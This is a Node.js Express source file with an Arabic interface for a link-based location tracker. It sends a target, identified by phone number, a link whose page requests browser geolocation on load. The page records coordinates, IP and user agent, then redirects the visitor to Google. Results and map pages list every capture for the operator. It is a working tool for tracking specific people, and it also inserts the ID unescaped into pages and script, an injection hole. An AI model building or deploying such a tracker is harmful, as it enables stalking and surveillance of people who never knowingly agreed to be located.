const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// قاعدة بيانات بسيطة
let locations = [];

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🚀 نظام تتبع المواقع</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    padding: 20px;
                    color: white;
                }
                
                .container {
                    max-width: 900px;
                    margin: 50px auto;
                    background: rgba(255, 255, 255, 0.95);
                    border-radius: 20px;
                    padding: 40px;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                    color: #333;
                }
                
                h1 {
                    color: #333;
                    margin-bottom: 30px;
                    text-align: center;
                    font-size: 2.5em;
                }
                
                .card {
                    background: #f8f9fa;
                    border-radius: 15px;
                    padding: 25px;
                    margin-bottom: 25px;
                    border-left: 5px solid #667eea;
                }
                
                .card h3 {
                    color: #333;
                    margin-bottom: 15px;
                }
                
                .code-box {
                    background: #2d3748;
                    color: #e2e8f0;
                    padding: 15px;
                    border-radius: 8px;
                    margin: 15px 0;
                    font-family: 'Courier New', monospace;
                    direction: ltr;
                    text-align: left;
                    overflow-x: auto;
                }
                
                .btn {
                    display: inline-block;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 12px 30px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: bold;
                    margin: 10px 5px;
                    transition: transform 0.3s;
                }
                
                .btn:hover {
                    transform: translateY(-3px);
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin: 30px 0;
                }
                
                .stat-box {
                    background: white;
                    padding: 20px;
                    border-radius: 10px;
                    text-align: center;
                    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                }
                
                .stat-number {
                    font-size: 2.5em;
                    font-weight: bold;
                    color: #667eea;
                }
                
                .stat-label {
                    color: #666;
                    margin-top: 10px;
                }
                
                .alert {
                    background: #fff3cd;
                    border: 1px solid #ffeaa7;
                    color: #856404;
                    padding: 15px;
                    border-radius: 8px;
                    margin: 20px 0;
                }
                
                @media (max-width: 768px) {
                    .container {
                        margin: 20px;
                        padding: 20px;
                    }
                    
                    h1 {
                        font-size: 1.8em;
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام تتبع المواقع الجغرافية</h1>
                
                <div class="alert">
                    ⚠️ <strong>ملاحظة هامة:</strong> يجب إعلام المستخدم بأن موقعه سيتم تسجيله والحصول على موافقته.
                </div>
                
                <div class="stats">
                    <div class="stat-box">
                        <div class="stat-number">${locations.length}</div>
                        <div class="stat-label">عدد المواقع المسجلة</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number">24/7</div>
                        <div class="stat-label">متاح دائماً</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number">🌍</div>
                        <div class="stat-label">يدعم جميع الدول</div>
                    </div>
                </div>
                
                <div class="card">
                    <h3>📌 كيفية الاستخدام:</h3>
                    <p>1. أنشئ رابط تتبع بأي رقم (رقم الهاتف أو أي معرف)</p>
                    <div class="code-box">https://موقعك.render.com/track/رقم_الهاتف</div>
                    
                    <p>2. مثال:</p>
                    <div class="code-box">https://موقعك.render.com/track/8391968596</div>
                    
                    <p>3. عندما يضغط الشخص على الرابط، سيتم حفظ موقعه تلقائياً</p>
                </div>
                
                <div class="card">
                    <h3>🔗 روابط سريعة:</h3>
                    <p>
                        <a href="/track/123456" class="btn" target="_blank">تجربة رابط تتبع</a>
                        <a href="/results" class="btn" target="_blank">عرض النتائج</a>
                        <a href="/map" class="btn" target="_blank">عرض الخريطة</a>
                    </p>
                    
                    <p style="margin-top: 20px;">
                        <strong>رابطك الحالي:</strong>
                        <div class="code-box">https://location2026-2.onrender.com</div>
                    </p>
                </div>
                
                <div class="card">
                    <h3>📊 كيف يعمل النظام:</h3>
                    <ol style="margin-right: 20px; margin-top: 10px;">
                        <li style="margin-bottom: 10px;">يقوم المستخدم بالضغط على الرابط الذي أرسلته له</li>
                        <li style="margin-bottom: 10px;">يطلب المتصفح منه الإذن لمشاركة موقعه</li>
                        <li style="margin-bottom: 10px;">إذا وافق، يتم حفظ إحداثيات موقعه (خط العرض والطول)</li>
                        <li style="margin-bottom: 10px;">يتم توجيهه إلى الصفحة التي تريدها (Google في المثال)</li>
                        <li>يمكنك مشاهدة جميع المواقع المسجلة من صفحة النتائج</li>
                    </ol>
                </div>
                
                <div style="text-align: center; margin-top: 40px; color: #666;">
                    <p>© 2024 نظام تتبع المواقع | إصدار 1.0</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// رابط التتبع
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>جاري التحضير...</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: white;
                    padding: 20px;
                }
                
                .container {
                    text-align: center;
                    max-width: 500px;
                    width: 100%;
                }
                
                h1 {
                    margin-bottom: 20px;
                    font-size: 2em;
                }
                
                .loader {
                    width: 60px;
                    height: 60px;
                    border: 5px solid rgba(255,255,255,0.3);
                    border-top: 5px solid white;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 30px auto;
                }
                
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                
                .info-box {
                    background: rgba(255,255,255,0.1);
                    border-radius: 15px;
                    padding: 20px;
                    margin-top: 30px;
                    backdrop-filter: blur(10px);
                }
                
                .step {
                    display: flex;
                    align-items: center;
                    margin: 15px 0;
                    text-align: right;
                }
                
                .step-number {
                    background: white;
                    color: #667eea;
                    width: 30px;
                    height: 30px;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-weight: bold;
                    margin-left: 15px;
                }
            </style>
            <script>
                // الحصول على الموقع الجغرافي
                function getLocation() {
                    if (navigator.geolocation) {
                        // طلب إذن المستخدم
                        navigator.geolocation.getCurrentPosition(
                            // النجاح
                            async (position) => {
                                const lat = position.coords.latitude;
                                const lon = position.coords.longitude;
                                const accuracy = position.coords.accuracy;
                                
                                // إرسال البيانات للخادم
                                try {
                                    await fetch('/api/save-location', {
                                        method: 'POST',
                                        headers: {
                                            'Content-Type': 'application/json',
                                        },
                                        body: JSON.stringify({
                                            id: '${userId}',
                                            latitude: lat,
                                            longitude: lon,
                                            accuracy: accuracy,
                                            timestamp: new Date().toISOString(),
                                            userAgent: navigator.userAgent,
                                            language: navigator.language
                                        })
                                    });
                                    
                                    document.getElementById('status').innerHTML = '✅ تم حفظ الموقع بنجاح!';
                                } catch (error) {
                                    console.error('Error:', error);
                                }
                                
                                // توجيه المستخدم بعد 3 ثواني
                                setTimeout(() => {
                                    window.location.href = 'https://www.google.com';
                                }, 3000);
                            },
                            // الفشل أو الرفض
                            (error) => {
                                console.log('Error:', error);
                                document.getElementById('status').innerHTML = '⚠️ لم يتم الحصول على الموقع';
                                
                                // توجيهه حتى لو رفض الموقع
                                setTimeout(() => {
                                    window.location.href = 'https://www.google.com';
                                }, 3000);
                            }
                        );
                    } else {
                        document.getElementById('status').innerHTML = '⚠️ المتصفح لا يدعم تحديد الموقع';
                        setTimeout(() => {
                            window.location.href = 'https://www.google.com';
                        }, 3000);
                    }
                }
                
                // تشغيل عند تحميل الصفحة
                window.onload = function() {
                    getLocation();
                };
            </script>
        </head>
        <body>
            <div class="container">
                <h1>جاري تحديد موقعك...</h1>
                
                <div class="loader"></div>
                
                <p id="status">يرجى السماح بمشاركة الموقع للمتابعة</p>
                
                <div class="info-box">
                    <div class="step">
                        <span class="step-number">1</span>
                        <span>طلب إذن مشاركة الموقع الجغرافي</span>
                    </div>
                    <div class="step">
                        <span class="step-number">2</span>
                        <span>جلب إحداثيات الموقع</span>
                    </div>
                    <div class="step">
                        <span class="step-number">3</span>
                        <span>سيتم توجيهك تلقائياً</span>
                    </div>
                </div>
                
                <p style="margin-top: 30px; font-size: 0.9em; opacity: 0.8;">
                    ID: ${userId} | ${new Date().toLocaleString('ar-SA')}
                </p>
            </div>
        </body>
        </html>
    `);
});

// API لحفظ الموقع
app.post('/api/save-location', (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA'),
            date: new Date().toISOString().split('T')[0]
        };
        
        locations.push(locationData);
        
        // حفظ فقط آخر 1000 سجل
        if (locations.length > 1000) {
            locations = locations.slice(-1000);
        }
        
        console.log('📍 موقع جديد:', {
            id: locationData.id,
            location: `${locationData.latitude}, ${locationData.longitude}`,
            accuracy: `${locationData.accuracy}m`,
            time: locationData.time
        });
        
        res.json({
            success: true,
            message: 'تم حفظ الموقع بنجاح',
            count: locations.length
        });
    } catch (error) {
        console.error('Error saving location:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// صفحة النتائج
app.get('/results', (req, res) => {
    let html = `
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>📊 النتائج المسجلة</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: #f5f5f5;
                    padding: 20px;
                    color: #333;
                }
                
                .container {
                    max-width: 1200px;
                    margin: 0 auto;
                    background: white;
                    border-radius: 15px;
                    padding: 30px;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                }
                
                h1 {
                    color: #333;
                    margin-bottom: 10px;
                    text-align: center;
                }
                
                .subtitle {
                    text-align: center;
                    color: #666;
                    margin-bottom: 30px;
                }
                
                .controls {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 30px;
                    flex-wrap: wrap;
                    gap: 15px;
                }
                
                .btn {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    border: none;
                    padding: 10px 25px;
                    border-radius: 50px;
                    cursor: pointer;
                    text-decoration: none;
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                    font-weight: 500;
                }
                
                .btn:hover {
                    transform: translateY(-2px);
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin-bottom: 30px;
                }
                
                .stat-card {
                    background: #f8f9fa;
                    padding: 20px;
                    border-radius: 10px;
                    text-align: center;
                    border-top: 4px solid #667eea;
                }
                
                .stat-number {
                    font-size: 2.5em;
                    font-weight: bold;
                    color: #333;
                }
                
                .stat-label {
                    color: #666;
                    margin-top: 5px;
                }
                
                table {
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 20px;
                }
                
                th {
                    background: #f1f3f5;
                    padding: 15px;
                    text-align: right;
                    color: #495057;
                    border-bottom: 2px solid #dee2e6;
                }
                
                td {
                    padding: 15px;
                    border-bottom: 1px solid #e9ecef;
                    text-align: right;
                }
                
                tr:hover {
                    background: #f8f9fa;
                }
                
                .map-link {
                    color: #228be6;
                    text-decoration: none;
                    font-weight: 500;
                }
                
                .map-link:hover {
                    text-decoration: underline;
                }
                
                .accuracy {
                    font-size: 0.9em;
                    color: #666;
                }
                
                .no-data {
                    text-align: center;
                    padding: 50px;
                    color: #999;
                }
                
                @media (max-width: 768px) {
                    .container {
                        padding: 15px;
                    }
                    
                    table {
                        display: block;
                        overflow-x: auto;
                    }
                    
                    .controls {
                        flex-direction: column;
                        align-items: stretch;
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>📊 النتائج المسجلة</h1>
                <p class="subtitle">جميع المواقع التي تم تتبعها</p>
                
                <div class="controls">
                    <a href="/" class="btn">🏠 الرئيسية</a>
                    <a href="/map" class="btn">🗺️ عرض الخريطة</a>
                    <button onclick="window.location.reload()" class="btn">🔄 تحديث</button>
                    <button onclick="downloadCSV()" class="btn">📥 تصدير CSV</button>
                </div>
                
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number">${locations.length}</div>
                        <div class="stat-label">إجمالي المسجلين</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${new Set(locations.map(l => l.id)).size}</div>
                        <div class="stat-label">مستخدمين مختلفين</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${locations.length > 0 ? new Date(locations[locations.length - 1].date).toLocaleDateString('ar-SA') : '--'}</div>
                        <div class="stat-label">آخر تحديث</div>
                    </div>
                </div>
    `;
    
    if (locations.length === 0) {
        html += `
                <div class="no-data">
                    <h2>📭 لا توجد بيانات مسجلة بعد</h2>
                    <p>لم يتم تسجيل أي مواقع حتى الآن</p>
                    <p>أرسل رابط تتبع لتبدأ في استقبال البيانات</p>
                </div>
        `;
    } else {
        html += `
                <table>
                    <thead>
                        <tr>
                            <th>رقم الهاتف / المعرف</th>
                            <th>الإحداثيات</th>
                            <th>الدقة</th>
                            <th>الوقت</th>
                            <th>الخريطة</th>
                        </tr>
                    </thead>
                    <tbody>
        `;
        
        // عرض أحدث النتائج أولاً
        [...locations].reverse().forEach(loc => {
            html += `
                        <tr>
                            <td><strong>${loc.id}</strong></td>
                            <td>${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}</td>
                            <td class="accuracy">${loc.accuracy ? loc.accuracy.toFixed(1) + ' م' : '--'}</td>
                            <td>${loc.time}</td>
                            <td>
                                <a class="map-link" href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank">
                                    👁️ عرض
                                </a>
                            </td>
                        </tr>
            `;
        });
        
        html += `
                    </tbody>
                </table>
        `;
    }
    
    html += `
            </div>
            
            <script>
                function downloadCSV() {
                    const headers = ['ID', 'Latitude', 'Longitude', 'Accuracy', 'Time', 'User Agent', 'IP'];
                    const csvContent = [
                        headers.join(','),
                        ...locations.map(l => [
                            l.id,
                            l.latitude,
                            l.longitude,
                            l.accuracy || '',
                            l.time,
                            l.userAgent ? '"' + l.userAgent.replace(/"/g, '""') + '"' : '',
                            l.ip || ''
                        ].join(','))
                    ].join('\\n');
                    
                    const blob = new Blob(['\\uFEFF' + csvContent], { type: 'text/csv;charset=utf-8;' });
                    const link = document.createElement('a');
                    const url = URL.createObjectURL(blob);
                    
                    link.setAttribute('href', url);
                    link.setAttribute('download', 'locations_${new Date().toISOString().split('T')[0]}.csv');
                    link.style.visibility = 'hidden';
                    
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
        </html>
    `;
    
    res.send(html);
});

// صفحة الخريطة
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🗺️ خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    height: 100vh;
                    display: flex;
                    flex-direction: column;
                }
                
                #map {
                    flex: 1;
                    width: 100%;
                }
                
                .header {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 20px;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    flex-wrap: wrap;
                }
                
                .header h1 {
                    margin: 0;
                    font-size: 1.5em;
                }
                
                .controls {
                    display: flex;
                    gap: 10px;
                    flex-wrap: wrap;
                }
                
                .btn {
                    background: rgba(255,255,255,0.2);
                    color: white;
                    border: 1px solid rgba(255,255,255,0.3);
                    padding: 8px 20px;
                    border-radius: 50px;
                    cursor: pointer;
                    text-decoration: none;
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                    backdrop-filter: blur(10px);
                }
                
                .btn:hover {
                    background: rgba(255,255,255,0.3);
                }
                
                .info-panel {
                    position: absolute;
                    top: 100px;
                    right: 20px;
                    background: white;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
                    z-index: 1000;
                    max-width: 300px;
                    display: none;
                }
                
                .info-panel.active {
                    display: block;
                }
                
                .legend {
                    position: absolute;
                    bottom: 30px;
                    right: 20px;
                    background: white;
                    padding: 15px;
                    border-radius: 10px;
                    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
                    z-index: 1000;
                }
                
                .legend-item {
                    display: flex;
                    align-items: center;
                    margin: 5px 0;
                }
                
                .legend-color {
                    width: 20px;
                    height: 20px;
                    border-radius: 50%;
                    margin-left: 10px;
                }
                
                @media (max-width: 768px) {
                    .header {
                        flex-direction: column;
                        gap: 15px;
                        text-align: center;
                    }
                    
                    .info-panel, .legend {
                        position: relative;
                        top: auto;
                        right: auto;
                        bottom: auto;
                        margin: 10px;
                        max-width: 100%;
                    }
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🗺️ خريطة المواقع المسجلة</h1>
                <div class="controls">
                    <a href="/" class="btn">🏠 الرئيسية</a>
                    <a href="/results" class="btn">📊 النتائج</a>
                    <button onclick="window.location.reload()" class="btn">🔄 تحديث الخريطة</button>
                    <button onclick="toggleInfo()" class="btn">ℹ️ معلومات</button>
                </div>
            </div>
            
            <div id="map"></div>
            
            <div class="info-panel" id="infoPanel">
                <h3>معلومات الخريطة</h3>
                <p>• عدد النقاط على الخريطة: <span id="pointCount">0</span></p>
                <p>• اخر تحديث: <span id="lastUpdate">${new Date().toLocaleString('ar-SA')}</span></p>
                <p>• اضغط على أي علامة لعرض التفاصيل</p>
                <p>• يمكنك تكبير/تصغير الخريطة باستخدام عجلة الماوس</p>
            </div>
            
            <div class="legend">
                <h4>مفتاح الألوان:</h4>
                <div class="legend-item">
                    <div class="legend-color" style="background: #e74c3c;"></div>
                    <span>مواقع حديثة (اليوم)</span>
                </div>
                <div class="legend-item">
                    <div class="legend-color" style="background: #3498db;"></div>
                    <span>مواقع قديمة</span>
                </div>
            </div>
            
            <script>
                // البيانات من الخادم
                const locations = ${JSON.stringify(locations)};
                
                // تهيئة الخريطة
                const map = L.map('map').setView([24.7136, 46.6753], 3);
                
                // إضافة طبقة الخريطة
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap',
                    maxZoom: 19
                }).addTo(map);
                
                // إضافة النقاط
                let markers = [];
                const today = new Date().toISOString().split('T')[0];
                
                locations.forEach((location, index) => {
                    if (location.latitude && location.longitude) {
                        // تحديد اللون بناءً على التاريخ
                        const isRecent = location.date === today;
                        const markerColor = isRecent ? '#e74c3c' : '#3498db';
                        
                        // إنشاء علامة مخصصة
                        const customIcon = L.divIcon({
                            html: \`<div style="
                                background: \${markerColor};
                                width: 20px;
                                height: 20px;
                                border-radius: 50%;
                                border: 3px solid white;
                                box-shadow: 0 0 10px rgba(0,0,0,0.3);
                            "></div>\`,
                            className: 'custom-marker',
                            iconSize: [20, 20]
                        });
                        
                        const marker = L.marker([location.latitude, location.longitude], {
                            icon: customIcon
                        }).addTo(map);
                        
                        // معلومات النافذة المنبثقة
                        const popupContent = \`
                            <div style="padding: 10px; min-width: 200px;">
                                <h4 style="margin: 0 0 10px 0;">رقم: \${location.id}</h4>
                                <p style="margin: 5px 0;"><strong>الإحداثيات:</strong><br>
                                \${location.latitude.toFixed(6)}, \${location.longitude.toFixed(6)}</p>
                                <p style="margin: 5px 0;"><strong>الوقت:</strong> \${location.time}</p>
                                <p style="margin: 5px 0;"><strong>الدقة:</strong> \${location.accuracy ? location.accuracy + ' متر' : 'غير معروف'}</p>
                                <a href="https://maps.google.com/?q=\${location.latitude},\${location.longitude}" 
                                   target="_blank" 
                                   style="display: inline-block; margin-top: 10px; padding: 5px 15px; background: #3498db; color: white; text-decoration: none; border-radius: 5px;">
                                   📍 فتح في خرائط Google
                                </a>
                            </div>
                        \`;
                        
                        marker.bindPopup(popupContent);
                        markers.push(marker);
                    }
                });
                
                // تحديث عدد النقاط
                document.getElementById('pointCount').textContent = markers.length;
                
                // إذا كان هناك نقاط، ضبط العرض عليها
                if (markers.length > 0) {
                    const group = new L.featureGroup(markers);
                    map.fitBounds(group.getBounds().pad(0.1));
                }
                
                // التحكم في لوحة المعلومات
                function toggleInfo() {
                    document.getElementById('infoPanel').classList.toggle('active');
                }
                
                // إغلاق لوحة المعلومات عند النقر خارجها
                document.addEventListener('click', (e) => {
                    const infoPanel = document.getElementById('infoPanel');
                    if (!infoPanel.contains(e.target) && !e.target.matches('[onclick="toggleInfo()"]')) {
                        infoPanel.classList.remove('active');
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// تشغيل الخادم
app.listen(PORT, () => {
    console.log(`
    🚀 الخادم يعمل على المنفذ ${PORT}
    🌐 رابط الوصول: http://localhost:${PORT}
    
    📌 روابط مهمة:
    1. الصفحة الرئيسية: /
    2. رابط تتبع: /track/رقم_الهاتف
    3. النتائج: /results
    4. الخريطة: /map
    
    ⚡ النظام جاهز لاستقبال طلبات التتبع!
    `);
});
